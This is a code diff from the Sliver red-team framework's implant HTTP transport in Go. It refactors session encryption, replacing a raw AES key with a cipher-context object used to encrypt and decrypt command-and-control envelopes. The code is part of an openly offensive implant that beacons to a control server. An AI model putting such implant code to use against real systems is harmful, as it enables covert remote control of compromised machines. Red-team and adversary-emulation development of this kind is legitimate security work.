@@ -43,9 +43,9 @@ import (
 	"net/url"
 	"time"
 
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -82,7 +82,7 @@ type SliverHTTPClient struct {
 	PathPrefix string
 	Client     *http.Client
 	ProxyURL   string
-	SessionKey *cryptography.AESKey
+	SessionCtx *cryptography.CipherContext
 	SessionID  string
 }
 
@@ -96,7 +96,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
 	}
 	sKey := cryptography.RandomAESKey()
-	s.SessionKey = &sKey
+	s.SessionCtx = cryptography.NewCipherContext(sKey)
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 	encryptedSessionInit, err := cryptography.RSAEncrypt(data, publicKey)
@@ -239,7 +239,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	if err != nil {
 		return err
 	}
-	sessionID, err := cryptography.GCMDecrypt(*s.SessionKey, data)
+	sessionID, err := s.SessionCtx.Decrypt(data)
 	if err != nil {
 		return err
 	}
@@ -256,7 +256,7 @@ var (
 
 // ReadEnvelope - Perform an HTTP GET request
 func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
-	if s.SessionID == "" || s.SessionKey == nil {
+	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
 	uri := s.pollURL()
@@ -295,7 +295,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 				return nil, err
 			}
 		}
-		data, err := cryptography.GCMDecrypt(*s.SessionKey, data)
+		data, err := s.SessionCtx.Decrypt(data)
 		if err != nil {
 			return nil, err
 		}
@@ -319,10 +319,10 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	if err != nil {
 		return err
 	}
-	if s.SessionID == "" || s.SessionKey == nil {
+	if s.SessionID == "" {
 		return errors.New("no session")
 	}
-	reqData, _ := cryptography.GCMEncrypt(*s.SessionKey, data)
+	reqData, _ := s.SessionCtx.Encrypt(data)
 
 	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
